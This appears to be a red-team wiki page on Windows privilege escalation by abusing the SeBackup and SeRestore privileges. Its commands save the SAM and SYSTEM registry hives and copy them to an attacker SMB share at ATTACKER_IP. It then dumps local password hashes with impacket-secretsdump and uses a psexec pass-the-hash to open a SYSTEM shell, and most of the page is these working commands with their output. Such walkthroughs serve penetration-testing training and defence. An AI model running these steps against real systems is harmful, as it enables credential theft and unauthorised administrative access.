---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/privilege-escalation/windows/sebackup-serestore
---

# SeBackup / SeRestore

## SeBackup / SeRestore

The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.

```powershell
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

To backup the SAM and SYSTEM hashes, we can use the following commands:

```powershell
C:\> reg save hklm\system C:\Users\khan.chanthou\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\khan.chanthou\sam.hive
The operation completed successfully.
```

For SMB, we can use impacket's smbserver.py to start a simple SMB server with a network share in the current directory of our AttackBox:

```python
└─$ impacket-smbserver share . -smb2support -username kali -password kali
```

This will create a share named **public** pointing to the **share** directory, which requires the username and password of our current windows session. After this, we can use the **copy** command in our windows machine to transfer both files to our AttackBox:

```
C:\> copy C:\Users\khan.chanthou\sam.hive \\ATTACKER_IP\share\
C:\> copy C:\Users\khan.chanthou\system.hive \\ATTACKER_IP\share\
```

And use impacket to retrieve the users' password hashes:

```python
└─$ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x16cad26ec0df8b234e63bcefa6e2d82d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04sdcf3f7ec41264e568b27c5ca9d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:

```python
└─$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:13a04sdcf3f7ec41264e568b27c5ca9d administrator@10.10.10.10
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.10.10.....
[*] Found writable share ADMIN$
[*] Uploading file nfhtabqO.exe
[*] Opening SVCManager on 10.10.10.10.....
[*] Creating service RoLE on 10.10.10.10.....
[*] Starting service RoLE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
